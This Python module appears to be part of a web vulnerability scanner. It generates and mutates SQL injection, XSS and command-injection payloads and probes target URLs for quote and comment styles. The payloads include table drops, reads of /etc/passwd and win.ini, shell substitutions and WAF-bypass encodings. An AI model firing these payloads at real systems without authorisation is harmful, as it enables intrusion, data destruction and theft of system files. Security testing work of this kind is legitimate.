"""Payload fuzzing engine - Intelligent payload mutation and generation.

Replaces static payload lists with adaptive fuzzing that:
1. Mutates base payloads with encoding variations
2. Adapts to target syntax (detects quote style, comment syntax)
3. Generates context-aware payloads
4. Learns from successful payloads

This dramatically increases coverage and reduces false negatives.
"""
from typing import List, Dict, Set, Optional
import urllib.parse
import html
import base64
import re
from enum import Enum


class EncodingType(Enum):
    """Payload encoding types."""
    NONE = "none"
    URL = "url"
    DOUBLE_URL = "double_url"
    HTML = "html"
    HEX = "hex"
    UNICODE = "unicode"
    BASE64 = "base64"


class QuoteStyle(Enum):
    """SQL/Code quote styles."""
    SINGLE = "'"
    DOUBLE = '"'
    BACKTICK = "`"
    NONE = ""


class CommentStyle(Enum):
    """SQL/Code comment styles."""
    DOUBLE_DASH = "--"
    HASH = "#"
    C_STYLE = "/*"
    NONE = ""


class PayloadFuzzer:
    """Intelligent payload fuzzer with mutation and adaptation."""
    
    def __init__(self, config: dict = None):
        """Initialize fuzzer.
        
        Args:
            config: Configuration dict
        """
        self.config = config or {}
        self.max_variations = self.config.get('max_payload_variations', 50)
        self.successful_payloads = set()  # Learn from successful payloads
        
        # Base payloads for different vuln types
        self.sqli_base_payloads = [
            "' OR '1'='1",
            "' AND '1'='2",
            "1' OR '1'='1'--",
            "admin'--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
        ]
        
        self.xss_base_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "'><script>alert(1)</script>",
        ]
        
        self.rce_base_payloads = [
            "; ls",
            "| whoami",
            "`id`",
            "$(whoami)",
            "&& cat /etc/passwd",
        ]
    
    def generate_sqli_payloads(
        self,
        context: Optional[Dict] = None,
        detected_quote: Optional[QuoteStyle] = None,
        detected_comment: Optional[CommentStyle] = None
    ) -> List[str]:
        """Generate SQL injection payloads with mutations.
        
        Args:
            context: Context information (parameter name, type, etc.)
            detected_quote: Detected quote style from target
            detected_comment: Detected comment style from target
        
        Returns:
            List of mutated payloads
        """
        payloads = []
        
        # If no detection, try all styles
        quote_styles = [detected_quote] if detected_quote else [QuoteStyle.SINGLE, QuoteStyle.DOUBLE]
        comment_styles = [detected_comment] if detected_comment else [CommentStyle.DOUBLE_DASH, CommentStyle.HASH]
        
        for base in self.sqli_base_payloads:
            # Original
            payloads.append(base)
            
            # Adapt quote style
            for quote in quote_styles:
                adapted = self._adapt_quote_style(base, quote)
                payloads.append(adapted)
                
                # Add comment variations
                for comment in comment_styles:
                    with_comment = f"{adapted}{comment.value}"
                    payloads.append(with_comment)
            
            # Encoding variations
            payloads.extend(self._encode_payload(base, [
                EncodingType.URL,
                EncodingType.DOUBLE_URL,
            ]))
            
            # Case variations
            payloads.append(base.upper())
            payloads.append(base.lower())
            payloads.append(self._random_case(base))
        
        # Limit to max variations
        return payloads[:self.max_variations]
    
    def generate_xss_payloads(
        self,
        context: Optional[Dict] = None,
        detected_context: Optional[str] = None
    ) -> List[str]:
        """Generate XSS payloads with context awareness.
        
        Args:
            context: Context information
            detected_context: Detected HTML context (attribute, script, etc.)
        
        Returns:
            List of mutated payloads
        """
        payloads = []
        
        for base in self.xss_base_payloads:
            # Original
            payloads.append(base)
            
            # Context-specific breakouts
            if detected_context == 'attribute':
                payloads.append(f'"{base}')
                payloads.append(f"'{base}")
                payloads.append(f'><script>alert(1)</script>')
            elif detected_context == 'script':
                payloads.append(f'</script>{base}')
                payloads.append(f';alert(1)//')
            
            # Encoding variations
            payloads.extend(self._encode_payload(base, [
                EncodingType.URL,
                EncodingType.HTML,
                EncodingType.UNICODE,
            ]))
            
            # WAF bypass techniques
            payloads.append(base.replace('<', '%3C').replace('>', '%3E'))
            payloads.append(base.replace('script', 'scr\x00ipt'))  # Null byte
            payloads.append(base.replace('alert', 'ale\\u0072t'))  # Unicode escape
        
        return payloads[:self.max_variations]
    
    def generate_rce_payloads(
        self,
        context: Optional[Dict] = None,
        detected_os: Optional[str] = None
    ) -> List[str]:
        """Generate RCE payloads with OS adaptation.
        
        Args:
            context: Context information
            detected_os: Detected operating system (linux, windows)
        
        Returns:
            List of mutated payloads
        """
        payloads = []
        
        # Adapt to OS
        if detected_os == 'windows':
            base_payloads = [
                "& dir",
                "| type C:\\Windows\\win.ini",
                "`powershell.exe`",
            ]
        else:
            base_payloads = self.rce_base_payloads
        
        for base in base_payloads:
            # Original
            payloads.append(base)
            
            # Command separator variations
            separators = [';', '|', '&', '&&', '||', '\n', '\r\n']
            for sep in separators:
                payloads.append(f"{sep} {base.lstrip(';|& ')}")
            
            # Quote escaping
            payloads.append(f"'{base}'")
            payloads.append(f'"{base}"')
            payloads.append(f'`{base}`')
            payloads.append(f'$({base})')
            
            # Encoding variations
            payloads.extend(self._encode_payload(base, [
                EncodingType.URL,
                EncodingType.HEX,
            ]))
        
        return payloads[:self.max_variations]
    
    def mutate_payload(
        self,
        base_payload: str,
        mutation_types: List[str] = None
    ) -> List[str]:
        """Mutate a single payload with various techniques.
        
        Args:
            base_payload: Base payload to mutate
            mutation_types: Types of mutations to apply
        
        Returns:
            List of mutated payloads
        """
        mutations = [base_payload]  # Include original
        
        mutation_types = mutation_types or ['encoding', 'case', 'whitespace', 'comment']
        
        if 'encoding' in mutation_types:
            mutations.extend(self._encode_payload(base_payload, list(EncodingType)))
        
        if 'case' in mutation_types:
            mutations.append(base_payload.upper())
            mutations.append(base_payload.lower())
            mutations.append(self._random_case(base_payload))
        
        if 'whitespace' in mutation_types:
            mutations.extend(self._mutate_whitespace(base_payload))
        
        if 'comment' in mutation_types:
            mutations.extend(self._insert_comments(base_payload))
        
        return list(set(mutations))  # Remove duplicates
    
    def learn_from_success(self, payload: str, vuln_type: str):
        """Learn from successful payload for future fuzzing.
        
        Args:
            payload: Successful payload
            vuln_type: Vulnerability type
        """
        self.successful_payloads.add((payload, vuln_type))
        
        # Could implement ML here to learn patterns
        # For now, just store successful payloads
    
    def detect_quote_style(self, response_text: str) -> Optional[QuoteStyle]:
        """Detect quote style from error messages.
        
        Args:
            response_text: Response text to analyze
        
        Returns:
            Detected quote style or None
        """
        # Look for common error patterns
        if "syntax error near ''" in response_text.lower():
            return QuoteStyle.SINGLE
        elif 'syntax error near ""' in response_text.lower():
            return QuoteStyle.DOUBLE
        elif "syntax error near ``" in response_text.lower():
            return QuoteStyle.BACKTICK
        
        return None
    
    def detect_comment_style(self, response_text: str) -> Optional[CommentStyle]:
        """Detect comment style from error messages.
        
        Args:
            response_text: Response text to analyze
        
        Returns:
            Detected comment style or None
        """
        if "--" in response_text and "comment" in response_text.lower():
            return CommentStyle.DOUBLE_DASH
        elif "#" in response_text and "comment" in response_text.lower():
            return CommentStyle.HASH
        elif "/*" in response_text:
            return CommentStyle.C_STYLE
        
        return None
    
    def _adapt_quote_style(self, payload: str, quote_style: QuoteStyle) -> str:
        """Adapt payload to use specific quote style.
        
        Args:
            payload: Original payload
            quote_style: Target quote style
        
        Returns:
            Adapted payload
        """
        # Replace quotes in payload
        adapted = payload.replace("'", quote_style.value)
        adapted = adapted.replace('"', quote_style.value)
        return adapted
    
    def _encode_payload(self, payload: str, encodings: List[EncodingType]) -> List[str]:
        """Encode payload with various schemes.
        
        Args:
            payload: Payload to encode
            encodings: List of encoding types
        
        Returns:
            List of encoded payloads
        """
        encoded = []
        
        for enc_type in encodings:
            if enc_type == EncodingType.URL:
                encoded.append(urllib.parse.quote(payload))
            elif enc_type == EncodingType.DOUBLE_URL:
                encoded.append(urllib.parse.quote(urllib.parse.quote(payload)))
            elif enc_type == EncodingType.HTML:
                encoded.append(html.escape(payload))
            elif enc_type == EncodingType.HEX:
                encoded.append(''.join(f'\\x{ord(c):02x}' for c in payload))
            elif enc_type == EncodingType.UNICODE:
                encoded.append(''.join(f'\\u{ord(c):04x}' for c in payload))
            elif enc_type == EncodingType.BASE64:
                encoded.append(base64.b64encode(payload.encode()).decode())
        
        return encoded
    
    def _random_case(self, payload: str) -> str:
        """Randomize case of alphabetic characters.
        
        Args:
            payload: Original payload
        
        Returns:
            Case-randomized payload
        """
        import random
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            if c.isalpha() else c
            for c in payload
        )
    
    def _mutate_whitespace(self, payload: str) -> List[str]:
        """Mutate whitespace in payload.
        
        Args:
            payload: Original payload
        
        Returns:
            List of whitespace-mutated payloads
        """
        mutations = []
        
        # Replace spaces with tabs
        mutations.append(payload.replace(' ', '\t'))
        
        # Replace spaces with multiple spaces
        mutations.append(payload.replace(' ', '  '))
        
        # Remove all whitespace
        mutations.append(''.join(payload.split()))
        
        # Add extra whitespace
        mutations.append(payload.replace(' ', '  '))
        
        return mutations
    
    def _insert_comments(self, payload: str) -> List[str]:
        """Insert comments into payload.
        
        Args:
            payload: Original payload
        
        Returns:
            List of comment-injected payloads
        """
        mutations = []
        
        # Insert SQL comments
        mutations.append(payload.replace(' ', '/**/ '))
        mutations.append(payload.replace(' ', ' -- \n'))
        mutations.append(payload.replace(' ', ' # \n'))
        
        return mutations


class AdaptiveFuzzer:
    """Adaptive fuzzer that learns from target responses.
    
    This fuzzer:
    1. Sends initial probe payloads
    2. Analyzes responses to detect syntax
    3. Generates adapted payloads
    4. Learns from successful attacks
    """
    
    def __init__(self, config: dict = None):
        """Initialize adaptive fuzzer."""
        self.fuzzer = PayloadFuzzer(config)
        self.detected_context = {}
    
    async def fuzz_parameter(
        self,
        url: str,
        param_name: str,
        vuln_type: str,
        client,
        baseline_response
    ) -> List[Dict]:
        """Adaptively fuzz a parameter.
        
        Args:
            url: Target URL
            param_name: Parameter name
            vuln_type: Vulnerability type ('sqli', 'xss', 'rce')
            client: HTTP client
            baseline_response: Baseline response
        
        Returns:
            List of findings
        """
        findings = []
        
        # Phase 1: Detection probes
        if vuln_type == 'sqli':
            # Send probe to detect quote style
            probe_response = await client.get(url, params={param_name: "'"})
            detected_quote = self.fuzzer.detect_quote_style(probe_response.text)
            detected_comment = self.fuzzer.detect_comment_style(probe_response.text)
            
            # Generate adapted payloads
            payloads = self.fuzzer.generate_sqli_payloads(
                detected_quote=detected_quote,
                detected_comment=detected_comment
            )
        
        elif vuln_type == 'xss':
            payloads = self.fuzzer.generate_xss_payloads()
        
        elif vuln_type == 'rce':
            payloads = self.fuzzer.generate_rce_payloads()
        
        else:
            return findings
        
        # Phase 2: Test adapted payloads
        # (Implementation would test each payload and use differential analysis)
        
        return findings
